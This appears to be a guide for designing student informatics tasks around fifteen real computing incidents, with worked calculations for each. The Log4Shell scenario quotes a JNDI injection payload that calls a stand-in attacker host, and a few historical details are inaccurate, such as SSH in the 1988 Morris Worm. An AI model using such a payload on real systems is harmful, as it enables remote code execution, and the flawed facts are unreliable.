# 💻 INFORMATICS - COMPUTATIONAL SYSTEMS & SCENARIO ARCHETYPES

## 🎯 FOUR CORE KNOWLEDGE DOMAINS

Informatics tasks must integrate these four interconnected knowledge domains:

---

## 1. 📖 LEXICAL KNOWLEDGE (Definitions, Concepts, Rules, Professional Terminology)

**What students need to recognize and define:**

### Fundamental Concepts

- **Data Types**: Integer, floating-point, string, boolean, array, object
- **Data Structures**: Arrays, lists, stacks, queues, trees, graphs, hash tables
- **Algorithms**: Sorting, searching, recursion, iteration, optimization
- **Complexity**: Big O notation (O(1), O(log n), O(n), O(n²), O(2ⁿ))

### Programming Concepts

- **Control Flow**: Conditionals (if/else), loops (for/while), functions
- **Variables & Scope**: Local vs. global, memory allocation
- **Operators**: Arithmetic, logical, bitwise, comparison
- **Error Handling**: Exceptions, validation, debugging

### System Concepts

- **Operating Systems**: Processes, threads, memory management, file systems
- **Networks**: Protocols (TCP/IP, HTTP, DNS), client-server, APIs
- **Databases**: SQL queries, indexing, transactions, normalization
- **Security**: Encryption, hashing, authentication, authorization, vulnerabilities

### Professional Terminology

- **Software Engineering**: Version control, testing, deployment, CI/CD
- **Cybersecurity**: Malware, exploits, zero-day, backdoor, DDoS, ransomware
- **Data Science**: Machine learning, classification, neural networks, training data
- **Web Development**: Frontend, backend, API, REST, authentication

---

## 2. 🔗 KNOWLEDGE & APPLICATION OF COMPUTER SCIENCE SYSTEMS

**System structure, computational logic, programming language specifics:**

### System Architecture

- **Client-Server Model**: Web applications, APIs, distributed systems
- **Databases**: Relational (SQL), NoSQL, indexes, query optimization
- **Cloud Infrastructure**: Virtual machines, containers, serverless, scaling
- **Network Protocols**: HTTP/HTTPS, TCP/UDP, DNS, SMTP, SSH

### Programming Logic

- **Algorithmic Thinking**: Breaking problems into steps, pseudocode
- **Conditional Logic**: Decision trees, boolean algebra, state machines
- **Iteration & Recursion**: Loops, recursive functions, base cases
- **Data Flow**: Input → Processing → Output, pipelines, transformations

### Computational Concepts

- **Race Conditions**: Timing bugs in concurrent systems
- **Buffer Overflow**: Memory corruption attacks
- **Integer Overflow**: 16-bit vs. 32-bit vs. 64-bit limits
- **Exponential Growth**: Viral spreading, compound interest, tree traversal
- **Hash Functions**: MD5, SHA-256, collision resistance

### Software Development

- **Version Control**: Git branches, commits, merges
- **Testing**: Unit tests, integration tests, regression tests
- **Debugging**: Stack traces, log analysis, breakpoints
- **Deployment**: Build pipelines, staging, production, rollback

---

## 3. 🌐 INTERDISCIPLINARY CONNECTIONS

**Computer science connects to nearly every field:**

### Informatics + Medicine/Healthcare

- **Medical Devices**: Therac-25 radiation therapy software
- **Electronic Health Records**: Data breaches, HIPAA compliance
- **Diagnostic Algorithms**: Machine learning for cancer detection
- **Telemedicine**: Video conferencing, remote patient monitoring

### Informatics + Finance/Economics

- **Algorithmic Trading**: Knight Capital flash crash
- **Cryptocurrency**: Bitcoin, blockchain, mining
- **Payment Processing**: Credit card security, PCI compliance
- **Risk Analysis**: Fraud detection, credit scoring

### Informatics + Transportation

- **Self-Driving Cars**: Uber fatal accident, sensor fusion, path planning
- **Traffic Management**: Route optimization, real-time navigation
- **Aviation**: Flight control systems, autopilot
- **Logistics**: Package routing, delivery optimization

### Informatics + Social Media/Communication

- **Privacy**: Facebook-Cambridge Analytica scandal
- **Content Moderation**: Algorithmic filtering, hate speech detection
- **Recommendation Systems**: YouTube, Netflix, Amazon
- **Messaging**: Slack, Discord, end-to-end encryption

### Informatics + Security/Defense

- **Cyberwarfare**: Stuxnet virus targeting Iranian nuclear facilities
- **Supply Chain Attacks**: SolarWinds backdoor
- **Cryptography**: RSA, AES, public-key infrastructure
- **Penetration Testing**: Bug bounty programs, vulnerability disclosure

### Informatics + Infrastructure

- **Power Grid**: Smart grid management, load balancing
- **Telecommunications**: 5G networks, fiber optics, CDNs
- **Cloud Services**: AWS, Azure, Google Cloud
- **DevOps**: Monitoring, alerting, incident response

---

## 4. 💾 KNOWLEDGE OF SUB-FIELDS, DEVICES, EQUIPMENT, INFRASTRUCTURE

**Domain-specific knowledge:**

### Hardware & Devices

- **Processors**: CPU architecture, clock speed, cores, threads
- **Memory**: RAM, cache, virtual memory, memory leaks
- **Storage**: HDD, SSD, RAID, backup systems
- **Networking Equipment**: Routers, switches, firewalls, load balancers
- **IoT Devices**: Smart home, industrial sensors, medical implants

### Software Categories

- **Operating Systems**: Windows, Linux, macOS, Android, iOS
- **Databases**: MySQL, PostgreSQL, MongoDB, Redis
- **Web Servers**: Apache, Nginx, IIS
- **Programming Languages**: Python, JavaScript, Java, C/C++, SQL
- **Frameworks**: React, Django, Spring, .NET

### Security Infrastructure

- **Firewalls**: Packet filtering, stateful inspection, WAF
- **IDS/IPS**: Intrusion detection/prevention systems
- **VPN**: Virtual private networks, tunneling
- **SSL/TLS**: Certificate authorities, HTTPS
- **SIEM**: Security information and event management

### Development Tools

- **IDEs**: Visual Studio Code, IntelliJ, Eclipse
- **Version Control**: Git, GitHub, GitLab
- **CI/CD**: Jenkins, Travis CI, GitHub Actions
- **Containerization**: Docker, Kubernetes
- **Monitoring**: Prometheus, Grafana, Splunk

---

## 🌟 15 SCENARIO ARCHETYPES FOR INFORMATICS TASKS

Each archetype represents authentic incidents where informatics knowledge is critical.

---

### 1. ⚡ THERAC-25 / RACE CONDITION & SOFTWARE SAFETY

**Professional Role**: Software engineer investigating fatal medical device bug
**CS Focus**: Race conditions, timing bugs, safety-critical systems, testing
**Example**: June 1985, East Texas Cancer Center, USA
**Key Skills**: Concurrent programming, timing analysis, input validation, energy calculations

**Typical Scenario Structure:**
"June 1985, East Texas Cancer Center. Phone rings: 'The Therac-25 machine... something's wrong!' Patient has terrible burns, but display shows normal dose! You check logs: race condition bug! Operator types quickly, edits parameters, but if buttons pressed too fast... software can't keep up! Safety check skipped, but power settings change! Normal: 1 gray (1 joule/kg tissue). Bug: 200 gray! Six cases, three dead. Operators type ~100 characters at 0.1 s each. If race condition window is 8 seconds, how dangerous? 200 gray = how many joules per kg?"

**What This Tests:**

- Race condition concept: Multiple threads/processes accessing shared state
- Timing analysis: Input rate vs. processing speed
- Energy conversion: Gray (radiation dose) = joules/kg
- Safety-critical software: Medical device regulations, formal verification
- Real tragedy: Multiple deaths from software bug

**CS Principles:**

- Concurrent programming requires synchronization (locks, semaphores)
- Race conditions occur when timing determines correctness
- Safety-critical systems need extensive testing and formal methods
- User input speed can exceed system processing capacity

---

### 2. 🚀 ARIANE 5 / INTEGER OVERFLOW

**Professional Role**: Onboard software developer analyzing rocket explosion
**CS Focus**: Integer overflow, type conversion, numeric limits, code reuse
**Example**: June 4, 1996, Kourou, French Guiana
**Key Skills**: Data types, 16-bit vs. 64-bit, signed integer limits, exception handling

**Typical Scenario Structure:**
"June 4, 1996, Kourou. Rocket launches beautifully. 37 seconds. Flash. Explosion. $7 billion lost. Investigation: Inertial Reference System converting 64-bit float (horizontal velocity) to 16-bit signed integer. Ariane 5 faster than Ariane 4. Overflow! Exception thrown. Computer froze. Backup system? Same code. Also froze. Self-destruct. Velocity value: 500,000 units. What's max 16-bit signed integer? By what % does 500,000 exceed this? Why not found in testing?"

**What This Tests:**

- Integer overflow: 16-bit signed max = 32,767 (2¹⁵ - 1)
- Type conversion: Larger type → smaller type can overflow
- Exception handling: Uncaught exceptions crash systems
- Code reuse dangers: Assumptions from old system don't hold
- Real disaster: Most expensive software bug in history

**CS Principles:**

- Data types have fixed ranges (8-bit, 16-bit, 32-bit, 64-bit)
- Signed integers: Range from -2^(n-1) to 2^(n-1)-1
- Type casting can silently fail or throw exceptions
- Testing must cover boundary conditions and edge cases

---

### 3. 🐛 MORRIS WORM / EXPONENTIAL SPREAD & PROBABILITY

**Professional Role**: System administrator combating first internet worm
**CS Focus**: Exponential growth, network propagation, probability, replication
**Example**: November 2, 1988, Cornell University, USA
**Key Skills**: Exponential functions, probability theory, network scanning, buffer overflow

**Typical Scenario Structure:**
"November 2, 1988, Cornell. Machines slow down! VAX, Sun workstations - all behaving strangely! CPU max! Memory fills! Entire university network paralyzed! MIT, Berkeley, Stanford - same! Morris Worm! Exploits SSH weak passwords, sendmail buffer overflow, finger daemon. Spreads! Problem: copies with 1/7 probability even if already on machine. If connects to 100 machines, spreads in 10s each, how long to infect 10,000? If 5 copies running, probability at least one more gets in with 1/7?"

**What This Tests:**

- Exponential growth: Each infected machine infects multiple others
- Time calculation: Spreading rate × infection time
- Probability: P(at least one) = 1 - P(none) = 1 - (6/7)⁵
- Network security: Buffer overflow, dictionary attacks, privilege escalation
- Real incident: First major internet worm, ~6,000 machines infected

**CS Principles:**

- Exponential growth: N(t) = N₀ × R^t (R = replication factor)
- Probability of independent events: P(A or B) = 1 - P(not A and not B)
- Buffer overflow: Writing beyond allocated memory
- Network worms: Self-replicating programs exploiting vulnerabilities

---

### 4. 🔓 EQUIFAX DATA BREACH / VULNERABILITY MANAGEMENT

**Professional Role**: Security engineer investigating massive data breach
**CS Focus**: Software vulnerabilities, patch management, data volume, download time
**Example**: May 2017, Equifax headquarters, Atlanta, USA
**Key Skills**: CVE database, Apache Struts, command injection, data size calculations

**Typical Scenario Structure:**
"May 2017, Equifax. Security audit. 147 million Americans' personal data at risk. Apache Struts 2.3.5 - from 2013! Four years old! CVE-2017-5638 published March: remote code execution! Command injection in Content-Type header. For 4 months unfixed. Hackers got in May-July. Executed shell commands. Queried databases. Extracted 147 million records. Each record ~2 KB. Calculate: total GB/TB? If download at 10 Mbit/s, time to download? Over 120 days, average daily amount?"

**What This Tests:**

- Data volume: 147M records × 2 KB/record = 294 GB ≈ 0.29 TB
- Download time: 294 GB ÷ (10 Mbit/s ÷ 8 bits/byte) = time
- Average daily: Total ÷ 120 days
- Vulnerability management: CVE tracking, patch urgency
- Real breach: One of largest in history, massive financial/reputational damage

**CS Principles:**

- Software vulnerabilities: Code flaws allowing unauthorized access
- Patch management: Critical updates must be applied promptly
- Command injection: Untrusted input executing system commands
- Data breach scale: Bytes → KB → MB → GB → TB

---

### 5. 🔒 WANNACRY RANSOMWARE / EXPONENTIAL INFECTION & ENCRYPTION

**Professional Role**: Hospital IT director managing ransomware outbreak
**CS Focus**: Malware propagation, exploit mechanics, encryption, infection rate
**Example**: May 12, 2017, Friday morning, London, NHS
**Key Skills**: EternalBlue exploit, SMBv1, AES encryption, infection modeling

**Typical Scenario Structure:**
"May 12, 2017, London NHS. Phones ringing everywhere. 'Machines not working!' Monitor: 'Oops, your files encrypted! $300 Bitcoin...' WannaCry ransomware! Hospital paralyzed. Patient records, surgical notes, CT scans - encrypted. Backup server also infected! EternalBlue exploit, stolen from NSA. SMBv1 vulnerability, buffer overflow, remote code execution, AES-128 encryption. Globally 150 countries, 230,000 machines in 4 days. Calculate: infection rate per hour? If each machine attacks 50 others/min, 10% success, new infections hourly from one machine? Model exponential spread!"

**What This Tests:**

- Average infection rate: 230,000 machines ÷ 96 hours ≈ 2,396 machines/hour
- New infections: 50 attacks/min × 60 min × 0.10 success = 300/hour from one machine
- Exponential model: N(t) = N₀ × e^(rt), where r = growth rate
- Encryption: AES-128 symmetric encryption (virtually unbreakable without key)
- Real outbreak: Global ransomware pandemic, hospitals crippled

**CS Principles:**

- Ransomware: Malware that encrypts data, demands payment
- Exploits: Code leveraging software vulnerabilities
- Exponential growth: Each infected machine infects multiple others
- Patching: MS17-010 existed but not deployed (old systems)

---

### 6. 📊 FACEBOOK-CAMBRIDGE ANALYTICA / DATA COLLECTION & PRIVACY

**Professional Role**: Data analyst investigating unauthorized data harvesting
**CS Focus**: Graph APIs, data aggregation, friend networks, data volume
**Example**: March 2018, Facebook headquarters, Menlo Park, USA
**Key Skills**: Graph theory, API permissions, network effects, data overlap calculations

**Typical Scenario Structure:**
"March 2018, Facebook. Christopher Wylie whistleblower: '87 million people's data used illegally!' 2014: Professor Kogan's app 'thisisyourdigitallife'. Personality quiz. 270,000 installed. Facebook Graph API v1.0 gave not just user data but FRIENDS' data too! Average 340 friends. Cambridge Analytica: psychological profiling, political campaigns, Brexit, Trump 2016. Micro-targeted ads. Industrial manipulation. Calculate: theoretical data access (users × friends)? But overlaps! Final 87M unique. % decrease from raw calc? Each profile 1 MB, total TB?"

**What This Tests:**

- Raw calculation: 270,000 users × 340 friends ≈ 91.8 million
- Overlap adjustment: Actual unique = 87M, decrease ≈ 5.2%
- Data volume: 87M profiles × 1 MB = 87,000 GB = 87 TB
- Graph theory: Friend networks, overlapping connections
- Real scandal: Psychological manipulation, election interference

**CS Principles:**

- Graph APIs: Access to social network data structures
- Network effects: Friends-of-friends exponential growth
- Data aggregation: Combining multiple data sources
- Privacy violations: Terms of service vs. actual practice

---

### 7. 💸 KNIGHT CAPITAL / ALGORITHMIC TRADING ERROR

**Professional Role**: Trader analyzing high-frequency trading disaster
**CS Focus**: Algorithm deployment, parallel systems, financial calculations
**Example**: August 1, 2012, 9:30 AM, New York Stock Exchange
**Key Skills**: Deployment errors, parallel processing, rate calculations, loss analysis

**Typical Scenario Structure:**
"August 1, 2012, 9:30 AM, NYSE. Stock market opens. Monitors crazy! Thousands of orders/second. Buy! Sell! Nobody placed them! Algorithm went rogue. New 'Power Peg' algorithm... wrong. 45 minutes: 4M trades, 150 stocks, hundreds of millions. Algorithm runs on 8 servers parallel. Stop 7... forgot 8th! Someone forgot to update it during deployment. Old test code remained. Bought high, sold low. Again. Again. Automatically. After 45 min, found 8th server. Too late. Loss: $440M. Calculate: trades/second? Avg loss/trade? Days' worth of revenue lost (usual: $100M/day)?"

**What This Tests:**

- Trades per second: 4,000,000 trades ÷ 2,700 seconds ≈ 1,481 trades/s
- Average loss per trade: $440M ÷ 4M trades = $110/trade
- Revenue equivalent: $440M ÷ $100M/day ≈ 4.4 days
- Deployment failure: Incomplete server updates
- Real disaster: Near-bankruptcy from single deployment error

**CS Principles:**

- Algorithmic trading: Automated buy/sell decisions at high speed
- Deployment: Must update ALL servers in distributed system
- Parallel processing: Multiple servers executing same algorithm
- Financial calculation: Volume × rate = total impact

---

### 8. ⚙️ STUXNET / CYBERWEAPON & INDUSTRIAL CONTROL

**Professional Role**: Security analyst examining sophisticated cyberweapon
**CS Focus**: Malware propagation, PLC manipulation, frequency calculations
**Example**: June 2010, Natanz, Iran
**Key Skills**: SCADA systems, zero-day exploits, physical effects of code, sabotage

**Typical Scenario Structure:**
"June 2010, Natanz, Iran. IAEA report: Iranian centrifuges breaking down. Inexplicably. Engineers baffled. Finally found: virus. STUXNET. Cyberweapon! 15,000 lines C code, 10+ programmers, state-sponsored (US-Israel). Spreads via USB, exploits 4 Windows zero-days, searches Siemens SCADA, installs rootkit. Checks: Iran? Natanz? Centrifuges? Manipulates PLC code. Normal spin: 1064 Hz. Stuxnet: accelerates to 1410 Hz, then slows to 2 Hz. Machines can't handle. Fall apart. Meanwhile: false data to monitors ('Everything fine!'). ~1000 centrifuges destroyed. Calculate: 1064 Hz = RPM? 1410 Hz = % faster? 2 Hz = % slower? Each $100K, total damage?"

**What This Tests:**

- Frequency → RPM: 1064 Hz × 60 s/min = 63,840 RPM
- Percent faster: (1410-1064)/1064 × 100% ≈ 32.5% faster
- Percent slower: (1064-2)/1064 × 100% ≈ 99.8% slower
- Total damage: 1000 centrifuges × $100,000 = $100M
- Real cyberweapon: First known malware to cause physical destruction

**CS Principles:**

- SCADA: Supervisory Control and Data Acquisition (industrial systems)
- PLC: Programmable Logic Controller (hardware automation)
- Zero-day exploits: Vulnerabilities unknown to vendor
- Cyber-physical attacks: Code affects physical world

---

### 9. 🗂️ YAHOO DATA BREACH / MASSIVE SCALE & PERSISTENCE

**Professional Role**: Forensic analyst investigating multi-year breaches
**CS Focus**: Data volume at petabyte scale, download time, breach detection
**Example**: September 2016, Yahoo headquarters, Sunnyvale, USA
**Key Skills**: Data storage calculations, network bandwidth, forensic analysis, spear phishing

**Typical Scenario Structure:**
"September 2016, Yahoo. Dark web: selling Yahoo data. Investigation: didn't happen 2016... 2013! Three years unnoticed! Wait... another breach. 2014. Both from 2013. 2014 breach: 500M accounts. 2013 breach: 3 BILLION. Every Yahoo account ever! Names, emails, phones, birth dates, MD5 password hashes, security Q&A. Spear phishing → credential theft → lateral movement → privileged access → full database. Presumably state-sponsored. Calculate: 3B accounts, 1 KB each = TB and PB? Download at 100 Mbit/s = time? 1B active users 2016, what % affected by 3B breach (include inactive)?"

**What This Tests:**

- Data volume: 3×10⁹ accounts × 1 KB = 3×10⁹ KB = 3 TB ≈ 0.003 PB
- Download time: 3 TB = 3×10¹² bytes, at 100 Mbit/s = 100×10⁶ bits/s ÷ 8 = time
- Percentage: 3B ÷ 1B = 300% (every active user + 2× inactive accounts)
- Real breach: Largest ever at the time, Yahoo's reputation destroyed

**CS Principles:**

- Data scale: Bytes → KB → MB → GB → TB → PB
- Spear phishing: Targeted social engineering emails
- Lateral movement: Expanding access within network after initial breach
- MD5 weakness: Fast hashing enables password cracking

---

### 10. 🚗 UBER SELF-DRIVING CAR / SENSOR FUSION & SAFETY

**Professional Role**: Software auditor investigating fatal autonomous vehicle crash
**CS Focus**: Classification algorithms, decision windows, physics calculations
**Example**: March 18, 2018, night, Tempe, Arizona
**Key Skills**: Machine learning classification, reaction time, braking distance, millisecond timing

**Typical Scenario Structure:**
"March 18, 2018, Tempe, Arizona. Elaine Herzberg pushes bicycle across road. Dark. Uber self-driving Volvo XC90. 6 LIDAR, 10 radar, 7 cameras. Doesn't slow. Doesn't brake. CRASH. Death. NTSB audit: car saw everything! LIDAR detected >5s before collision. But classification... constantly changed. 'Unknown'. 'Vehicle'. 'Bicycle'. 'Unknown'. 'Bicycle'. Software RECALCULATES TRAJECTORY each change! Resets prediction! Shortly before: 'EMERGENCY BRAKE!' But... disabled. Too many false positives. Uber: driver brakes, not computer. Driver? Watching video on phone. Speed: 43 mph (19 m/s). Detected 5s before, from what distance? If emergency brake (0.6g ≈ 6 m/s²) started earlier, could stop? Braking distance? Decision window milliseconds?"

**What This Tests:**

- Distance: 19 m/s × 5 s = 95 meters
- Braking distance: v² = v₀² + 2as, solve for s: s = v₀²/(2a) = (19²)/(2×6) ≈ 30 m
- Could stop: Yes! 30 m braking distance < 95 m available
- Decision window: Time when braking still effective
- Real tragedy: Preventable death from software + human failure

**CS Principles:**

- Machine learning classification: Categorizing sensor data
- Sensor fusion: Combining multiple sensors (LIDAR, radar, camera)
- Real-time systems: Millisecond-level decision requirements
- Safety-critical software: Autonomous vehicles must handle edge cases

---

### 11. 🌐 SOLARWINDS SUPPLY CHAIN ATTACK / TRUSTED SOFTWARE BACKDOOR

**Professional Role**: Threat intelligence analyst investigating supply chain compromise
**CS Focus**: Supply chain security, scale calculations, APT operations
**Example**: December 2020, FireEye announcement
**Key Skills**: Software supply chain, digital signatures, data exfiltration, APT tactics

**Typical Scenario Structure:**
"December 2020. FireEye announces: attacked! Not just us. SolarWinds Orion - network monitoring, 33,000 companies globally. Microsoft, Cisco, Intel, Fortune 500, US gov. Russian APT29/Cozy Bear broke into SolarWinds build system. Modified source code. Inserted SUNBURST backdoor. SolarWinds built it, digitally signed it, released as official update! March-June: 18,000 customers downloaded infected update. Trusted it (digitally signed!). Backdoor dormant 2 weeks, then C&C via DNS, exfiltrated data, lateral movement. Supply chain attack - if you trust vendor, signed binaries... how detect? Calculate: 18K downloaded, ~10% actively exploited, how many actually attacked? Avg 100 GB stolen each, total TB? APT 50 hackers, companies per hacker?"

**What This Tests:**

- Companies attacked: 18,000 × 0.10 = 1,800 companies
- Data volume: 1,800 × 100 GB = 180,000 GB = 180 TB
- Companies per hacker: 1,800 ÷ 50 = 36 companies/hacker
- Supply chain attack: Compromise trusted vendor to reach customers
- Real attack: Massive national security breach, months undetected

**CS Principles:**

- Supply chain security: Trusting software vendors introduces risk
- Digital signatures: Prove authenticity but don't guarantee safety
- APT (Advanced Persistent Threat): State-sponsored, long-term intrusions
- Command & Control: Malware communicating with attacker servers

---

### 12. 🌊 GITHUB DDOS / AMPLIFICATION ATTACK

**Professional Role**: Network engineer defending against record DDoS
**CS Focus**: Memcached amplification, traffic volume, attack mechanics
**Example**: February 28, 2018, 13:21 UTC, GitHub
**Key Skills**: DDoS, UDP amplification, traffic calculations, bits vs. bytes

**Typical Scenario Structure:**
"February 28, 2018, 13:21 UTC, GitHub. Monitors red. All alarms! DDOS! 1.35 terabits/second! Largest in history! Where from?! Memcached amplification attack. Memcached: distributed cache, UDP port 11211. Thousands of open Memcached servers on internet. Hacker sends 15-byte request, IP spoofing (source IP = GitHub). Memcached responds... 750 KB! To GitHub! Amplification: 50,000x. ~50K Memcached servers parallel. 8 minutes peak. GitHub unavailable globally. Akamai helps filter. Calculate: 1.35 Tbit/s = GB/s? 8 min (480s) = total data PB? 50K servers, avg Mbit/s each? Amplification factor (750 KB response from 15-byte request)?"

**What This Tests:**

- Traffic rate: 1.35 Tbit/s ÷ 8 bits/byte ≈ 169 GB/s
- Total data: 169 GB/s × 480 s = 81,120 GB ≈ 81 TB ≈ 0.081 PB
- Per server: 1.35 Tbit/s ÷ 50,000 ≈ 27 Mbit/s each
- Amplification: 750 KB ÷ 15 bytes = 50,000× factor
- Real attack: Largest DDoS ever recorded (at the time)

**CS Principles:**

- DDoS: Distributed Denial of Service (overwhelm with traffic)
- Amplification attack: Small request → large response
- IP spoofing: Fake source address to redirect responses
- UDP: Connectionless protocol, easy to spoof

---

### 13. 🛒 TARGET CREDIT CARD BREACH / SUPPLY CHAIN & POS MALWARE

**Professional Role**: PCI compliance auditor investigating retail data breach
**CS Focus**: Third-party risk, RAM scraping, lateral movement, data extraction
**Example**: November-December 2013, Target retail chain, USA
**Key Skills**: Supply chain risk, malware analysis, data volume, breach timeline

**Typical Scenario Structure:**
"November-December 2013, pre-Christmas shopping. Target. Banks call: 'Fraudulent transactions. Tons. All Target cards.' PCI DSS audit: 40M credit cards, 70M personal info. Hackers didn't attack Target first. Attacked HVAC supplier Fazio Mechanical Services! Phishing email → credential theft. Fazio had VPN to Target (to monitor heating-ventilation). Hackers got in via this VPN. Lateral movement. Malware on POS terminals. RAM scraping: read card data from memory BEFORE encryption. Track 1 and Track 2 - all magnetic stripe info. Exfiltration to external servers. 19 days unnoticed. Calculate: each card track ~80 bytes, 40M cards = GB? Over 19 days, cards/minute avg? 1,800 stores, cards per store avg?"

**What This Tests:**

- Data volume: 40×10⁶ cards × 80 bytes = 3.2×10⁹ bytes = 3.2 GB
- Cards per minute: 40M ÷ (19 days × 24 hours × 60 min) ≈ 1,461 cards/min
- Per store: 40M ÷ 1,800 ≈ 22,222 cards/store
- Third-party risk: Vendor access = attack vector
- Real breach: Massive holiday shopping season theft

**CS Principles:**

- Supply chain risk: Third-party vendors as weak links
- RAM scraping: Reading memory before encryption
- Lateral movement: Expanding access after initial foothold
- POS malware: Point-of-sale system targeting

---

### 14. 🔍 SLACK ELDORADO BUG / API VULNERABILITY

**Professional Role**: Bug bounty hunter discovering critical information leak
**CS Focus**: API security, search functionality, data exposure, scale estimation
**Example**: March 2017, Slack
**Key Skills**: API testing, parameter manipulation, data leak analysis, risk assessment

**Typical Scenario Structure:**
"March 2017. You're bug bounty hunter. Examining Slack. Test search function. Type word, enter. Result in JSON. Look at JSON structure. Play with parameters. Add: include_archived: true? Enter. BOOM. Archived messages appear. But wait... not your workspace's. Other channels! Realize: ALL public channels' archived messages accessible! Not just your workspace! EVERY Slack workspace! Try: search 'password'. Tens of thousands of results. Different companies. Passwords. API keys. AWS credentials. Secret projects. Server addresses. Everything. 'Eldorado bug' - CRITICAL severity. Report to Slack. Fix in 24 hours. Reward: $3,000! But wonder: how long active? How many exploited unreported? Calculate: 10M workspaces, avg 100 public channels each, total channels? Each 10K archived messages, total messages? 1% contain sensitive info (password, API key), how much sensitive data at risk?"

**What This Tests:**

- Total channels: 10M workspaces × 100 channels = 1 billion channels
- Total messages: 1B channels × 10K messages = 10 trillion messages
- Sensitive data: 10T messages × 0.01 = 100 billion sensitive items
- API vulnerability: Unintended data access through API
- Real bug: Critical information disclosure, responsible disclosure

**CS Principles:**

- API security: Proper access controls on endpoints
- Parameter manipulation: Testing API limits and permissions
- Bug bounty programs: Incentivizing security research
- Responsible disclosure: Report to vendor before public

---

### 15. 🪵 LOG4SHELL ZERO-DAY / CRITICAL INFRASTRUCTURE VULNERABILITY

**Professional Role**: Security engineer responding to widespread zero-day
**CS Focus**: Zero-day exploits, JNDI injection, patch urgency, scale calculations
**Example**: December 9, 2021, Minecraft server
**Key Skills**: Vulnerability analysis, patch management, attack surface, time pressure

**Typical Scenario Structure:**
"December 9, 2021. Minecraft community: servers hacked. You're cybersecurity researcher. Strange chat message: ${jndi:ldap://attacker.com/a}. Test server. Type in chat. Enter. Server freezes! Network monitor: connection to remote server. Downloads something. Runs it. ZERO-DAY! Not Minecraft bug. Much worse. Log4j - most popular Java logging library. EVERYWHERE. Minecraft, Apache, Tesla, Twitter, Amazon, Apple iCloud, Steam. Practically every Java app. JNDI injection: Log4j logs string with ${jndi:ldap://...}, initiates LDAP lookup, connects remote, downloads Java class, EXECUTES. Remote Code Execution. CVE-2021-44228. CVSS 10.0 CRITICAL! Next 72 hours: chaos. Millions patch. Hackers exploit. Automated scanning everywhere. 3M Java servers use Log4j. Calculate: only 30% patch in 24h, how many vulnerable? Hackers scan 1000 servers/hour, how long check all vulnerable? 10% of vulnerable actually exploitable, victims in 72h?"

**What This Tests:**

- Vulnerable after 24h: 3M × (1 - 0.30) = 2.1M servers
- Scan time: 2.1M servers ÷ 1000 servers/hour = 2,100 hours ≈ 87.5 days (parallel scanning faster)
- Exploitable: 2.1M × 0.10 = 210,000 potentially exploited in 72h
- Zero-day: Vulnerability unknown to vendor before disclosure
- Real crisis: Massive global patching effort, critical infrastructure at risk

**CS Principles:**

- Zero-day vulnerability: No patch available when disclosed
- JNDI injection: Code injection through logging library
- Attack surface: Widely-used library = massive exposure
- Patch urgency: Critical vulnerabilities require immediate response
- CVSS scoring: 10.0 = maximum severity

---

## 🚫 AVOID THESE CLICHÉS

### Generic Abstract CS:

- ❌ "Write a program to sort numbers"
- ❌ "Create a website with a login form"
- ❌ "Build a database for a library"
- ❌ "Make a calculator application"

### Vague Scenarios:

- ❌ "A company has a security problem"
- ❌ "Someone's code has a bug"
- ❌ "Data needs to be processed"

---

## ✅ WHAT TO EMBRACE

### Specific Historical Incidents:

- ✅ Therac-25 (June 1985)
- ✅ Ariane 5 (June 4, 1996)
- ✅ Morris Worm (November 2, 1988)
- ✅ WannaCry (May 12, 2017)
- ✅ Log4Shell (December 9, 2021)

### Real Professional Contexts:

- ✅ Software engineer debugging fatal medical device
- ✅ Security analyst investigating nation-state cyberweapon
- ✅ Network engineer defending against record DDoS
- ✅ Bug bounty hunter discovering critical vulnerability

### Life-Critical Stakes:

- ✅ "Three people died from race condition bug"
- ✅ "Hospital paralyzed, patient records encrypted"
- ✅ "$7 billion rocket exploded from integer overflow"
- ✅ "147 million people's data stolen"

---

## 📌 KEY SUCCESS METRICS

A well-designed informatics task should:

1. **Place student in authentic professional role** (not "write a program...")
2. **Provide specific historical incident** (exact dates, locations, companies)
3. **Connect CS to real-world consequences** (deaths, financial loss, privacy violations)
4. **Require curriculum-aligned CS concepts** (algorithms, data structures, security, etc.)
5. **Integrate interdisciplinary knowledge** (medicine, finance, infrastructure, etc.)
6. **Use realistic systems and data** (real software, actual vulnerabilities)
7. **Create intellectual engagement** ("THIS is how bugs cause disasters!")

---

## 🎨 CREATIVITY PRINCIPLE

**These 15 archetypes are EXAMPLES, not rigid templates.**

Use them as **inspiration** to create NEW scenarios following the same principles:

- Real incidents or contemporary issues
- Professional roles with authentic responsibilities
- Specific data (dates, versions, CVE numbers, breach sizes)
- Life-critical or financially significant outcomes
- Accurate CS applications

**80/20 Rule**:

- 80% creative new scenarios **inspired by** archetypes
- 20% direct use of archetype examples

---

## 📖 FINAL PRINCIPLE

**Every informatics task should answer:**

> **"When will I ever use this in real life?"**

With authentic scenarios that show:

- **Therac-25**: Race conditions killed people
- **Ariane 5**: Integer overflow destroyed $7B rocket
- **WannaCry**: Unpatched systems paralyzed hospitals
- **Log4Shell**: Critical vulnerability affected millions
- **Stuxnet**: Code destroyed physical infrastructure

**The goal**: Students see informatics as **powerful and dangerous**, requiring responsibility, testing, and security awareness.
